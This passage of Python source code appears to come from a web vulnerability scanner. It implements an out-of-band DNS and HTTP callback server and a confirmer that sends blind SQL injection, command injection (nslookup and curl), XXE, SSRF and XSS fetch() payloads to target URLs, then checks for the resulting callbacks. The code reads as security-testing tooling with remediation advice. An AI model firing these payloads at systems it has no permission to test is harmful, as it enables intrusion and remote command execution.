# ════════════════════════════════════════════════════════════════════════
#  M-19-01 — OOB AUDIT LOGGER
#  Irrefutable evidence log for all OOB operations & exploit attempts
# ════════════════════════════════════════════════════════════════════════

class OOBAuditLogger:
    """
    Singleton audit trail for every OOB operation, exploit attempt,
    and confirmation event.  Writes to:
      • webscout_oob_audit.log   (human-readable, append-mode)
      • webscout_oob_audit.json  (structured, written on export)

    Usage
    -----
    audit = OOBAuditLogger.get()
    audit.record("oob_hit",   {"protocol": "DNS", "token": "abc", "src": "10.0.0.1"})
    audit.record("confirmed", {"vuln": "Blind SQLi", "url": target, "payload": p})
    audit.export_json()
    """

    _instance = None

    @classmethod
    def get(cls) -> "OOBAuditLogger":
        if cls._instance is None:
            cls._instance = cls()
        return cls._instance

    def __init__(self):
        self._records: list = []
        self._lock = threading.Lock()
        # File logger — append mode so multiple scans accumulate evidence
        self._file_log = _oob_logging.getLogger("WebScout.OOBAudit")
        if not self._file_log.handlers:
            _fh = _oob_logging.FileHandler("webscout_oob_audit.log", encoding="utf-8")
            _fh.setFormatter(_oob_logging.Formatter(
                "%(asctime)s | %(levelname)-8s | %(message)s",
                datefmt="%Y-%m-%dT%H:%M:%S",
            ))
            self._file_log.addHandler(_fh)
            self._file_log.setLevel(_oob_logging.DEBUG)
            self._file_log.propagate = False

    # ── core ─────────────────────────────────────────────────────────────

    def record(self, event_type: str, details: dict) -> dict:
        """Record one audit event.  Returns the stored record."""
        rec = {
            "timestamp":  datetime.now().isoformat(timespec="milliseconds"),
            "event_type": event_type,
            **details,
        }
        with self._lock:
            self._records.append(rec)
        try:
            self._file_log.info(
                "[%s] %s",
                event_type,
                json.dumps({k: v for k, v in details.items()
                            if k not in ("raw_request", "raw_response")},
                           default=str)[:800],
            )
        except Exception:
            pass
        return rec

    def record_oob_hit(self, protocol: str, token: str, query: str,
                       source_ip: str, raw: dict = None):
        return self.record("oob_hit", {
            "protocol":  protocol,
            "token":     token,
            "query":     query,
            "source_ip": source_ip,
            "raw":       raw or {},
        })

    def record_exploit(self, vuln_type: str, url: str, payload: str,
                       confirmed: bool, evidence: str = ""):
        return self.record("exploit_attempt", {
            "vuln_type": vuln_type,
            "url":       url,
            "payload":   payload[:300],
            "confirmed": confirmed,
            "evidence":  evidence[:500],
        })

    def record_session(self, event: str, auth_type: str, detail: str = ""):
        return self.record("session_event", {
            "event":     event,
            "auth_type": auth_type,
            "detail":    detail[:300],
        })

    def get_records(self, event_type: str = None) -> list:
        with self._lock:
            if event_type:
                return [r for r in self._records if r["event_type"] == event_type]
            return list(self._records)

    def export_json(self, path: str = "webscout_oob_audit.json") -> str:
        records = self.get_records()
        try:
            with open(path, "w", encoding="utf-8") as fh:
                json.dump(records, fh, indent=2, default=str)
            log("INFO", f"[OOBAudit] Exported {len(records)} records → {path}")
        except Exception as e:
            log("WARN", f"[OOBAudit] Export failed: {e}")
        return path

    def summary(self) -> dict:
        records = self.get_records()
        confirmed = [r for r in records
                     if r.get("event_type") == "exploit_attempt" and r.get("confirmed")]
        oob_hits  = [r for r in records if r.get("event_type") == "oob_hit"]
        return {
            "total_events":      len(records),
            "oob_hits":          len(oob_hits),
            "confirmed_exploits":len(confirmed),
            "dns_hits":          sum(1 for h in oob_hits if h.get("protocol") == "DNS"),
            "http_hits":         sum(1 for h in oob_hits if h.get("protocol") == "HTTP"),
        }


# ════════════════════════════════════════════════════════════════════════
#  M-19-02 — OOB SERVER ENHANCED
#  Dual-protocol OOB: DNS (dnslib) + HTTP  with token-based correlation
# ════════════════════════════════════════════════════════════════════════

class OOBServerEnhanced:
    """
    Embedded OOB collaborator with two independent channels:

    Channel 1 — HTTP  (always available)
        Listens on a random high port.  Any incoming GET/POST containing
        the session token in the path is recorded as a hit.

    Channel 2 — DNS   (requires dnslib)
        Listens on a configurable UDP port (default 5353).
        Any A/AAAA/CNAME query whose QNAME contains the session token
        is recorded.  Responds with 127.0.0.1.

    Correlation
        Each session gets a unique 16-char hex token embedded in every
        OOB URL/domain.  Hits are matched back to a specific test via
        tag suffixes appended to the token (e.g. <token>-sqli).

    Usage
    -----
    sv = OOBServerEnhanced()
    sv.start()

    http_url  = sv.http_url("sqli")          # http://LOCAL_IP:PORT/<token>-sqli
    dns_domain = sv.dns_domain("cmdinjection")  # <token>-cmdinjection.<dns_domain>

    # inject into payloads …
    await asyncio.sleep(5)

    hits = sv.get_hits("sqli")               # all callbacks tagged "sqli"
    sv.stop()
    """

    _DEFAULT_DNS_PORT = 15353

    def __init__(self, http_host: str = "0.0.0.0",
                 dns_port: int = _DEFAULT_DNS_PORT):
        self._http_host   = http_host
        self._dns_port    = dns_port
        self._token       = secrets.token_hex(8)          # 16 hex chars
        self._hits: list  = []
        self._hits_lock   = threading.Lock()
        self._audit       = OOBAuditLogger.get()

        # HTTP server internals
        self._http_server = None
        self._http_thread = None
        self._http_port   = 0

        # DNS server internals
        self._dns_server  = None
        self._dns_thread  = None
        self._dns_active  = False

    # ── start / stop ─────────────────────────────────────────────────────

    def start(self) -> dict:
        """Start both channels.  Returns dict with ports/domains."""
        self._start_http()
        if _HAS_DNSLIB:
            self._start_dns()
        log("INT", f"[OOBServerEnhanced] HTTP port={self._http_port} | "
                   f"DNS port={self._dns_port if self._dns_active else 'N/A (dnslib missing)'} | "
                   f"token={self._token}")
        return {
            "http_port": self._http_port,
            "dns_port":  self._dns_port if self._dns_active else None,
            "token":     self._token,
        }

    def stop(self):
        """Shut down both channels."""
        if self._http_server:
            try:
                self._http_server.shutdown()
                self._http_server.server_close()
            except Exception:
                pass
            self._http_server = None
        if self._http_thread and self._http_thread.is_alive():
            self._http_thread.join(timeout=3)

        if self._dns_server:
            try:
                self._dns_server.stop()
            except Exception:
                pass
            self._dns_server = None
        if self._dns_thread and self._dns_thread.is_alive():
            self._dns_thread.join(timeout=3)

        self._audit.export_json()
        log("INFO", f"[OOBServerEnhanced] Stopped — {len(self._hits)} total hit(s) recorded")

    # ── HTTP channel ─────────────────────────────────────────────────────

    def _start_http(self):
        hits_ref  = self._hits
        lock_ref  = self._hits_lock
        token_ref = self._token
        audit_ref = self._audit

        class _Handler(http.server.BaseHTTPRequestHandler):
            def _record(self, method: str, body: str = ""):
                rec = {
                    "protocol": "HTTP",
                    "method":   method,
                    "path":     self.path,
                    "headers":  dict(self.headers),
                    "body":     body[:2000],
                    "time":     datetime.now().isoformat(),
                    "remote":   self.client_address[0],
                    "token":    token_ref,
                }
                with lock_ref:
                    hits_ref.append(rec)
                # Extract tag from path: /<token>-<tag>/...
                tag = ""
                m = re.search(rf"{re.escape(token_ref)}-([a-z0-9_-]+)", self.path)
                if m:
                    tag = m.group(1)
                audit_ref.record_oob_hit(
                    "HTTP", token_ref, self.path, self.client_address[0], rec
                )
                log("CONF",
                    f"[OOB-HTTP] callback from {self.client_address[0]} "
                    f"path={self.path[:80]} tag={tag or '(none)'}")

            def do_GET(self):
                self._record("GET")
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"ok")

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode(errors="replace") if length else ""
                self._record("POST", body)
                self.send_response(200)
                self.end_headers()

            def log_message(self, *_):
                pass  # silence default access log

        self._http_server = socketserver.TCPServer(
            (self._http_host, 0), _Handler
        )
        self._http_server.allow_reuse_address = True
        self._http_port = self._http_server.server_address[1]
        self._http_thread = threading.Thread(
            target=self._http_server.serve_forever, daemon=True
        )
        self._http_thread.start()

    # ── DNS channel ──────────────────────────────────────────────────────

    def _start_dns(self):
        if not _HAS_DNSLIB:
            return
        hits_ref  = self._hits
        lock_ref  = self._hits_lock
        token_ref = self._token
        audit_ref = self._audit

        class _OOBResolver(_dnslib.server.BaseResolver):
            def resolve(self, request, handler):
                qname = str(request.q.qname).rstrip(".")
                rec = {
                    "protocol": "DNS",
                    "query":    qname,
                    "qtype":    _dnslib.QTYPE[request.q.qtype],
                    "remote":   handler.client_address[0],
                    "time":     datetime.now().isoformat(),
                    "token":    token_ref,
                }
                with lock_ref:
                    hits_ref.append(rec)
                # Extract tag
                tag = ""
                m = re.search(rf"{re.escape(token_ref)}-([a-z0-9_-]+)", qname)
                if m:
                    tag = m.group(1)
                audit_ref.record_oob_hit(
                    "DNS", token_ref, qname, handler.client_address[0], rec
                )
                log("CONF",
                    f"[OOB-DNS] query from {handler.client_address[0]} "
                    f"qname={qname[:80]} tag={tag or '(none)'}")
                # Reply with 127.0.0.1
                reply = request.reply()
                reply.add_answer(_dnslib.RR(
                    rname=request.q.qname,
                    rtype=_dnslib.QTYPE.A,
                    rdata=_dnslib.A("127.0.0.1"),
                    ttl=1,
                ))
                return reply

        try:
            self._dns_server = _dnslib.server.DNSServer(
                _OOBResolver(),
                port=self._dns_port,
                address="0.0.0.0",
                tcp=False,
            )
            self._dns_thread = threading.Thread(
                target=self._dns_server.start, daemon=True
            )
            self._dns_thread.start()
            self._dns_active = True
        except Exception as e:
            log("WARN", f"[OOBServerEnhanced] DNS server failed to start: {e}")
            self._dns_active = False

    # ── URL / domain builders ─────────────────────────────────────────────

    def _local_ip(self) -> str:
        """Best-effort local IP for OOB callbacks."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def http_url(self, tag: str = "") -> str:
        """Return full OOB HTTP callback URL with optional tag."""
        safe_tag = re.sub(r"[^a-z0-9_-]", "", tag.lower())[:20]
        suffix   = f"-{safe_tag}" if safe_tag else ""
        return f"http://{self._local_ip()}:{self._http_port}/{self._token}{suffix}"

    def dns_domain(self, tag: str = "", base_domain: str = "oob.test") -> str:
        """Return OOB DNS domain (usable in nslookup/LOAD_FILE payloads)."""
        safe_tag = re.sub(r"[^a-z0-9_-]", "", tag.lower())[:20]
        suffix   = f"-{safe_tag}" if safe_tag else ""
        return f"{self._token}{suffix}.{base_domain}"

    # ── hit retrieval ────────────────────────────────────────────────────

    def get_hits(self, tag: str = "", wait_secs: float = 0.0) -> list:
        """Return all hits (optionally filtered by tag)."""
        if wait_secs > 0:
            time.sleep(wait_secs)
        with self._hits_lock:
            if not tag:
                return list(self._hits)
            pattern = f"{self._token}-{tag}"
            return [
                h for h in self._hits
                if pattern in h.get("query", "") or pattern in h.get("path", "")
            ]

    async def wait_for_hit(self, tag: str = "", timeout: float = 20.0,
                           poll_interval: float = 1.0) -> list:
        """Async poll until at least one hit arrives or timeout expires."""
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            hits = self.get_hits(tag)
            if hits:
                return hits
            await asyncio.sleep(poll_interval)
        return []

    def has_hit(self, tag: str = "") -> bool:
        return bool(self.get_hits(tag))

    def clear_hits(self):
        with self._hits_lock:
            self._hits.clear()


# ════════════════════════════════════════════════════════════════════════
#  M-19-03 — OOB VULNERABILITY CONFIRMER
#  SQLi LOAD_FILE · Command Injection · XXE · SSRF — all via OOB
# ════════════════════════════════════════════════════════════════════════

class OOBVulnConfirmer:
    """
    Confirms blind vulnerabilities using OOBServerEnhanced callbacks.

    Supported channels:
      confirm_blind_sqli_oob()    — MySQL LOAD_FILE UNC / DNS exfil
      confirm_cmd_injection_oob() — nslookup / ping / curl DNS callback
      confirm_xxe_oob()           — DOCTYPE SYSTEM entity fetch
      confirm_ssrf_oob()          — Parameter injection to OOB URL
      confirm_xss_oob()           — XSS payload with fetch() to OOB URL

    Each method:
      1. Builds OOB-tagged payload
      2. Injects via client
      3. Waits for callback
      4. Returns Finding if confirmed
    """

    def __init__(self, oob_server: OOBServerEnhanced,
                 client: "WebScoutClient"):
        self._sv    = oob_server
        self._client = client
        self._audit  = OOBAuditLogger.get()

    # ── Blind SQLi via MySQL LOAD_FILE (DNS/SMB OOB) ─────────────────────

    async def confirm_blind_sqli_oob(
        self,
        target_url: str,
        param: str,
        wait_secs: float = 15.0,
    ) -> Optional[Finding]:
        """
        Confirms blind SQLi using MySQL LOAD_FILE() to trigger DNS lookup.

        Payload (MySQL Windows UNC variant):
          ' AND 1=2 UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,
            (SELECT MID(@@version,1,5)),
            0x2e,
            '<oob-domain>',0x5c5c61))-- -

        Payload (MySQL DNS-via-host_query):
          ' OR (SELECT LOAD_FILE(0x5c5c<oob-hex>\\a))='
        """
        tag  = "sqli"
        domain = self._sv.dns_domain(tag)
        domain_hex = domain.encode().hex()

        payloads = [
            # UNC path via CONCAT — triggers DNS on Windows MySQL
            (
                f"' AND (SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,"
                f"(SELECT MID(@@version,1,5)),0x2e,"
                f"0x{domain_hex},0x5c5c61)))-- -",
                "MySQL LOAD_FILE UNC"
            ),
            # Direct hex UNC
            (
                f"' UNION SELECT LOAD_FILE(0x5c5c{domain_hex}5c61)-- -",
                "MySQL LOAD_FILE hex-UNC"
            ),
            # INTO OUTFILE via DNS — some setups
            (
                f"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT 0x{domain_hex})))-- -",
                "MySQL EXTRACTVALUE DNS trigger"
            ),
            # PostgreSQL copy_to trigger
            (
                f"'; COPY (SELECT '') TO PROGRAM 'nslookup {domain}';-- -",
                "PostgreSQL nslookup"
            ),
        ]

        parsed = urlparse(target_url)
        params = parse_qs(parsed.query)

        for payload_str, desc in payloads:
            tag_used = f"sqli-{hashlib.md5(payload_str.encode()).hexdigest()[:6]}"
            oob_http = self._sv.http_url(tag)

            # Also try HTTP-based OOB via INTO OUTFILE
            http_payloads = [
                (
                    f"' UNION SELECT LOAD_FILE('{oob_http}')-- -",
                    "MySQL LOAD_FILE HTTP OOB"
                ),
                (
                    f"'; SELECT LOAD_FILE('{oob_http}');-- -",
                    "MySQL LOAD_FILE HTTP stacked"
                ),
            ]

            all_p = [(payload_str, desc)] + http_payloads

            for pstr, pdesc in all_p:
                if param and param in params:
                    atk_params = {**params, param: [pstr]}
                    test_url = urlunparse(
                        parsed._replace(query=urlencode(atk_params, doseq=True))
                    )
                else:
                    sep = "&" if "?" in target_url else "?"
                    test_url = f"{target_url}{sep}{param}={quote(pstr)}"

                try:
                    await self._client.get(test_url)
                except Exception:
                    pass

                self._audit.record_exploit(
                    "Blind SQLi OOB", test_url, pstr, False,
                    f"Awaiting OOB callback — {pdesc}"
                )

        # Wait for any hit tagged "sqli"
        hits = await self._sv.wait_for_hit("sqli", timeout=wait_secs)

        confirmed = bool(hits)
        if confirmed:
            evidence = f"OOB callback(s): {hits[:2]} | payloads tried: {len(payloads)}"
            self._audit.record_exploit(
                "Blind SQLi OOB", target_url, "LOAD_FILE/nslookup", True, evidence
            )
            log("CONF",
                f"[OOB-SQLi] CONFIRMED via OOB — {len(hits)} callback(s) "
                f"from param='{param}'")
            return Finding(
                plugin="oob_enhanced",
                title=f"[CONFIRMED] Blind SQL Injection via OOB — param '{param}'",
                severity="CRITICAL",
                confidence=99.0,
                description=(
                    f"Blind SQL injection confirmed via Out-of-Band channel. "
                    f"The database server initiated an outbound DNS/HTTP request "
                    f"to the OOB collaborator, providing irrefutable evidence of "
                    f"injectable parameter '{param}' in {target_url}."
                ),
                evidence=evidence,
                url=target_url,
                param=param,
                payload=payloads[0][0][:200],
                remediation=(
                    "Use parameterized queries / prepared statements. "
                    "Never interpolate user input into SQL. "
                    "Apply principle of least privilege on DB user."
                ),
                cwe="CWE-89", cvss=9.8, owasp="A03",
                poc=(
                    f"# OOB confirmation — DNS hit received at {self._sv.dns_domain('sqli')}\n"
                    f"# HTTP hit received at {self._sv.http_url('sqli')}\n"
                    f"# Hits: {json.dumps(hits[:1], default=str)[:300]}"
                ),
                tags=["sqli", "blind", "oob", "oob-callback", "confirmed",
                      "load_file", "dns-exfil"],
            )
        return None

    # ── Command Injection via nslookup / ping OOB ─────────────────────────

    async def confirm_cmd_injection_oob(
        self,
        target_url: str,
        param: str,
        wait_secs: float = 12.0,
    ) -> Optional[Finding]:
        """
        Confirms command injection using DNS/HTTP callbacks from injected
        nslookup, ping, curl, or wget commands.
        """
        tag    = "cmdinj"
        domain = self._sv.dns_domain(tag)
        http   = self._sv.http_url(tag)

        # Payloads: each attempts to trigger an outbound DNS/HTTP request
        payloads = [
            # Unix — nslookup
            f"; nslookup {domain} #",
            f"| nslookup {domain}",
            f"`nslookup {domain}`",
            f"$(nslookup {domain})",
            # Unix — curl/wget
            f"; curl -s {http} #",
            f"| curl -s {http}",
            f"`curl -s {http}`",
            f"$(curl -s {http})",
            # Unix — ping DNS trigger
            f"; ping -c1 {domain} #",
            f"| ping -c1 {domain}",
            # Windows — nslookup
            f"& nslookup {domain} &",
            f"| nslookup {domain}",
            # Windows — ping
            f"& ping -n 1 {domain} &",
            # Newline bypass
            f"\n nslookup {domain}",
            f"\r\n nslookup {domain}",
        ]

        parsed = urlparse(target_url)
        params = parse_qs(parsed.query)

        for pl in payloads:
            if param and param in params:
                atk_params = {**params, param: [pl]}
                test_url = urlunparse(
                    parsed._replace(query=urlencode(atk_params, doseq=True))
                )
            else:
                sep = "&" if "?" in target_url else "?"
                test_url = f"{target_url}{sep}{param}={quote(pl)}"
            try:
                await self._client.get(test_url)
            except Exception:
                pass
            self._audit.record_exploit(
                "Command Injection OOB", test_url, pl, False, "awaiting callback"
            )

        hits = await self._sv.wait_for_hit("cmdinj", timeout=wait_secs)

        if hits:
            evidence = f"OOB DNS/HTTP hit(s): {hits[:2]}"
            self._audit.record_exploit(
                "Command Injection OOB", target_url, "nslookup/ping/curl", True, evidence
            )
            log("CONF",
                f"[OOB-CmdInj] CONFIRMED via OOB — {len(hits)} callback(s) "
                f"param='{param}'")
            return Finding(
                plugin="oob_enhanced",
                title=f"[CONFIRMED] Command Injection via OOB — param '{param}'",
                severity="CRITICAL",
                confidence=99.0,
                description=(
                    f"Command injection confirmed via Out-of-Band DNS/HTTP callback. "
                    f"The server executed an injected shell command (nslookup/ping/curl) "
                    f"that contacted the OOB collaborator, providing irrefutable RCE evidence."
                ),
                evidence=evidence,
                url=target_url,
                param=param,
                payload=payloads[0][:200],
                remediation=(
                    "Never pass user input to shell commands. "
                    "Use language-native APIs instead of exec/system. "
                    "Apply strict allowlist input validation."
                ),
                cwe="CWE-78", cvss=10.0, owasp="A03",
                poc=(
                    f"# Injected: nslookup {domain}\n"
                    f"# OOB DNS hit: {hits[0].get('query','') if hits else 'N/A'}"
                ),
                tags=["rce", "cmd-injection", "oob", "oob-callback",
                      "confirmed", "nslookup", "dns-exfil"],
            )
        return None

    # ── XXE via External Entity OOB ───────────────────────────────────────

    async def confirm_xxe_oob(
        self,
        target_url: str,
        wait_secs: float = 10.0,
    ) -> Optional[Finding]:
        """
        Sends multiple XXE payloads referencing OOB HTTP/DNS URL.
        Confirms via callback.
        """
        tag  = "xxe"
        http = self._sv.http_url(tag)
        dns  = self._sv.dns_domain(tag)

        payloads = [
            # Classic HTTP entity
            (
                f'<?xml version="1.0"?>'
                f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{http}">]>'
                f'<root>&xxe;</root>',
                "XXE direct HTTP entity"
            ),
            # Parameter entity (blind XXE via OOB)
            (
                f'<?xml version="1.0"?>'
                f'<!DOCTYPE foo [<!ENTITY % oob SYSTEM "{http}/param-entity">'
                f'%oob;]><root/>',
                "XXE parameter entity"
            ),
            # DNS entity (firewalled HTTP)
            (
                f'<?xml version="1.0"?>'
                f'<!DOCTYPE foo [<!ENTITY xxedns SYSTEM "http://{dns}/">]>'
                f'<root>&xxedns;</root>',
                "XXE DNS entity"
            ),
            # SVG-embedded XXE (for file upload endpoints)
            (
                f'<?xml version="1.0"?>'
                f'<!DOCTYPE svg [<!ENTITY oob SYSTEM "{http}/svg-xxe">]>'
                f'<svg>&oob;</svg>',
                "XXE via SVG"
            ),
        ]

        for payload_str, desc in payloads:
            try:
                await self._client.post(
                    target_url,
                    data=payload_str,
                    headers={"Content-Type": "application/xml"},
                )
            except Exception:
                pass
            self._audit.record_exploit(
                "XXE OOB", target_url, payload_str[:200], False, desc
            )

        hits = await self._sv.wait_for_hit("xxe", timeout=wait_secs)

        if hits:
            evidence = f"OOB XXE hit(s): {hits[:2]}"
            self._audit.record_exploit("XXE OOB", target_url, "DOCTYPE SYSTEM", True, evidence)
            log("CONF", f"[OOB-XXE] CONFIRMED — {len(hits)} callback(s)")
            return Finding(
                plugin="oob_enhanced",
                title="[CONFIRMED] XXE (XML External Entity) via OOB Callback",
                severity="CRITICAL",
                confidence=99.0,
                description=(
                    "XML External Entity injection confirmed via OOB HTTP/DNS callback. "
                    "The XML parser resolved an external SYSTEM entity pointing to the "
                    "collaborator server, confirming the application is vulnerable to XXE."
                ),
                evidence=evidence,
                url=target_url,
                payload=payloads[0][0][:200],
                remediation=(
                    "Disable external XML entity processing (FEATURE_EXTERNAL_GENERAL_ENTITIES=false). "
                    "Use safe XML parsers. Validate and reject DOCTYPE declarations."
                ),
                cwe="CWE-611", cvss=9.1, owasp="A05",
                tags=["xxe", "oob", "oob-callback", "confirmed", "xml"],
            )
        return None

    # ── SSRF via OOB ─────────────────────────────────────────────────────

    async def confirm_ssrf_oob(
        self,
        target_url: str,
        wait_secs: float = 8.0,
    ) -> Optional[Finding]:
        """
        Injects OOB URL into SSRF-prone parameters and confirms via callback.
        """
        tag  = "ssrf"
        http = self._sv.http_url(tag)
        dns  = self._sv.dns_domain(tag)

        parsed = urlparse(target_url)
        params = parse_qs(parsed.query)

        ssrf_params = [
            p for p in params
            if any(k in p.lower() for k in [
                "url", "src", "href", "path", "file", "page", "target",
                "dest", "redirect", "uri", "link", "fetch", "load",
                "resource", "proxy", "callback", "webhook", "next",
                "returnurl", "continue", "goto",
            ])
        ] or list(params.keys())[:4]

        oob_variants = [http, f"http://{dns}/", f"http://{dns}:80/ssrf-probe"]

        for p in ssrf_params:
            for oob in oob_variants:
                np = {**params, p: [oob]}
                test_url = urlunparse(parsed._replace(query=urlencode(np, doseq=True)))
                try:
                    await self._client.get(test_url)
                except Exception:
                    pass
                self._audit.record_exploit(
                    "SSRF OOB", test_url, oob, False, f"param={p}"
                )

        hits = await self._sv.wait_for_hit("ssrf", timeout=wait_secs)

        if hits:
            evidence = f"OOB SSRF hit(s): {hits[:2]}"
            self._audit.record_exploit("SSRF OOB", target_url, http, True, evidence)
            log("CONF", f"[OOB-SSRF] CONFIRMED — {len(hits)} callback(s)")
            return Finding(
                plugin="oob_enhanced",
                title="[CONFIRMED] SSRF via OOB Callback",
                severity="CRITICAL",
                confidence=99.0,
                description=(
                    "Server-Side Request Forgery confirmed via OOB HTTP/DNS callback. "
                    "The server made an outbound request to the collaborator URL, "
                    "confirming it fetches attacker-controlled resources."
                ),
                evidence=evidence,
                url=target_url,
                payload=http,
                remediation=(
                    "Validate and allowlist all URLs fetched server-side. "
                    "Block internal CIDR ranges (RFC 1918). "
                    "Use a DNS-rebinding-resistant resolution library."
                ),
                cwe="CWE-918", cvss=9.8, owasp="A10",
                tags=["ssrf", "oob", "oob-callback", "confirmed"],
            )
        return None

    # ── XSS via OOB ──────────────────────────────────────────────────────

    async def confirm_xss_oob(
        self,
        target_url: str,
        param: str = "",
        wait_secs: float = 12.0,
    ) -> Optional[Finding]:
        """
        Injects XSS payload that fires fetch()/Image() request to OOB
        server on execution, confirming stored/reflected XSS.
        """
        tag  = "xss"
        http = self._sv.http_url(tag)

        payloads = [
            f'"><img src=x onerror="fetch(\'{http}\')">',
            f'"><script>fetch(\'{http}\')</script>',
            f'\'><svg onload="new Image().src=\'{http}\'">',
            f'javascript:fetch(\'{http}\')',
            f'<details open ontoggle="fetch(\'{http}\')">',
            f'"><body onload="fetch(\'{http}\')">',
        ]

        parsed = urlparse(target_url)
        params = parse_qs(parsed.query)

        for pl in payloads:
            if param and param in params:
                atk_params = {**params, param: [pl]}
                test_url = urlunparse(
                    parsed._replace(query=urlencode(atk_params, doseq=True))
                )
            elif params:
                first = list(params.keys())[0]
                atk_params = {**params, first: [pl]}
                test_url = urlunparse(
                    parsed._replace(query=urlencode(atk_params, doseq=True))
                )
            else:
                test_url = target_url
            try:
                await self._client.get(test_url)
            except Exception:
                pass

        hits = await self._sv.wait_for_hit("xss", timeout=wait_secs)

        if hits:
            evidence = f"OOB XSS fetch() callback: {hits[:2]}"
            self._audit.record_exploit("XSS OOB", target_url, payloads[0], True, evidence)
            log("CONF", f"[OOB-XSS] CONFIRMED — {len(hits)} callback(s) param='{param}'")
            return Finding(
                plugin="oob_enhanced",
                title=f"[CONFIRMED] XSS (OOB fetch callback) — param '{param}'",
                severity="HIGH",
                confidence=99.0,
                description=(
                    "Cross-Site Scripting confirmed via OOB HTTP callback. "
                    "The injected JavaScript payload executed fetch() to the collaborator, "
                    "confirming script execution in a browser context."
                ),
                evidence=evidence,
                url=target_url,
                param=param,
                payload=payloads[0][:200],
                remediation=(
                    "Apply context-aware output encoding. "
                    "Implement strict Content-Security-Policy. "
                    "Use httpOnly cookies to mitigate session theft."
                ),
                cwe="CWE-79", cvss=8.2, owasp="A03",
                tags=["xss", "oob", "oob-callback", "confirmed", "fetch"],
            )
        return None

    # ── Convenience: run all OOB checks ──────────────────────────────────

    async def run_all(self, target_url: str,
                      params: list = None,
                      wait_secs: float = 15.0) -> list:
        """Run all OOB confirmation methods against the target."""
        findings = []
        params = params or []

        # SSRF
        r = await self.confirm_ssrf_oob(target_url, wait_secs=wait_secs)
        if r:
            findings.append(r)

        # XXE
        r = await self.confirm_xxe_oob(target_url, wait_secs=wait_secs)
        if r:
            findings.append(r)

        # SQLi & Cmd injection per param
        for p in (params or [""]):
            r = await self.confirm_blind_sqli_oob(target_url, p, wait_secs=wait_secs)
            if r:
                findings.append(r)
            r = await self.confirm_cmd_injection_oob(target_url, p, wait_secs=wait_secs)
            if r:
                findings.append(r)

        # XSS
        for p in (params or [""]):
            r = await self.confirm_xss_oob(target_url, p, wait_secs=wait_secs)
            if r:
                findings.append(r)

        return findings


# ════════════════════════════════════════════════════════════════════════
#  M-19-04 — DYNAMIC RETEST ENGINE
#  3-step algorithm: baseline1 → attack → reset/baseline2 → compare
#  Eliminates false positives from dynamic application state changes
# ════════════════════════════════════════════════════════════════════════

class DynamicRetestEngine:
    """
    Three-step dynamic re-testing to eliminate false positives caused
    by application state changes (e.g. random tokens, session counters,
    dynamic timestamps).

    Algorithm
    ---------
    Step 1  baseline_1  — GET clean URL, record response
    Step 2  attack      — GET URL with payload injected, record response
    Step 3  baseline_2  — GET clean URL again (reset state), record response

    Verdict
    -------
    CONFIRMED   if  (baseline_1 ≈ baseline_2)   AND  (attack ≠ baseline_1)
    FALSE-POS   if  baselines differ             OR   attack ≈ baseline_1
    UNSTABLE    if  baselines differ (dynamic app) — flag as uncertain

    Applications
    ------------
    • IDOR       — inject different user IDs, compare object access
    • Tampering  — inject modified values, detect acceptance
    • Mass Assign — inject privileged fields, detect reflection
    """

    # Minimum similarity for baselines to be "stable"
    BASELINE_STABILITY = 0.82
    # Maximum similarity for attack to be "different"
    ATTACK_DIFF_THRESHOLD = 0.92
    # Pause between requests to avoid rate-limit skew
    INTER_REQUEST_PAUSE = 0.25

    def __init__(self):
        self._audit = OOBAuditLogger.get()

    # ── core retest ──────────────────────────────────────────────────────

    async def retest(
        self,
        client: "WebScoutClient",
        url: str,
        param: str,
        payload: str,
        method: str = "GET",
        post_data: dict = None,
        compare_fn=None,
    ) -> dict:
        """
        Execute 3-step retest.

        Parameters
        ----------
        compare_fn : callable(atk_resp, base_resp) -> bool
            Custom comparison function.  If None, uses Levenshtein ratio.

        Returns
        -------
        dict with keys:
          confirmed (bool), verdict (str), evidence (str),
          baseline1, attack, baseline2
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        def _inject(p_dict, p_name, value):
            if p_name and p_name in p_dict:
                return {**p_dict, p_name: [value]}
            return p_dict

        # ─ Step 1: baseline ──────────────────────────────────────────────
        await asyncio.sleep(self.INTER_REQUEST_PAUSE)
        base1_resp = await client.get(url) if method == "GET" else \
                     await client.post(url, data=post_data)
        if not base1_resp:
            return {"confirmed": False, "verdict": "error",
                    "evidence": "Baseline-1 request failed", "error": True}

        # ─ Step 2: attack ─────────────────────────────────────────────────
        await asyncio.sleep(self.INTER_REQUEST_PAUSE)
        if method == "GET":
            atk_params = _inject(params, param, payload)
            atk_url    = urlunparse(parsed._replace(
                query=urlencode(atk_params, doseq=True)))
            atk_resp   = await client.get(atk_url)
        else:
            atk_data = dict(post_data or {})
            if param:
                atk_data[param] = payload
            atk_resp = await client.post(url, data=atk_data)
            atk_url  = url
        if not atk_resp:
            return {"confirmed": False, "verdict": "error",
                    "evidence": "Attack request failed", "error": True}

        # ─ Step 3: reset + baseline_2 ────────────────────────────────────
        await asyncio.sleep(self.INTER_REQUEST_PAUSE)
        base2_resp = await client.get(url) if method == "GET" else \
                     await client.post(url, data=post_data)
        if not base2_resp:
            return {"confirmed": False, "verdict": "error",
                    "evidence": "Baseline-2 request failed", "error": True}

        # ─ Compare ───────────────────────────────────────────────────────
        b1_text  = base1_resp.get("text", "")
        b2_text  = base2_resp.get("text", "")
        atk_text = atk_resp.get("text", "")

        baseline_sim   = _levenshtein_ratio(b1_text, b2_text)
        atk_vs_base_sim = _levenshtein_ratio(atk_text, b1_text)

        baselines_stable = baseline_sim >= self.BASELINE_STABILITY

        if compare_fn is not None:
            atk_differs = compare_fn(atk_resp, base1_resp)
        else:
            atk_differs = atk_vs_base_sim < self.ATTACK_DIFF_THRESHOLD

        # Status-code delta also counts as "different"
        status_differs = base1_resp.get("status", 0) != atk_resp.get("status", 0)

        confirmed = baselines_stable and (atk_differs or status_differs)

        if not baselines_stable:
            verdict = "unstable"  # Dynamic app — cannot reliably test
        elif confirmed:
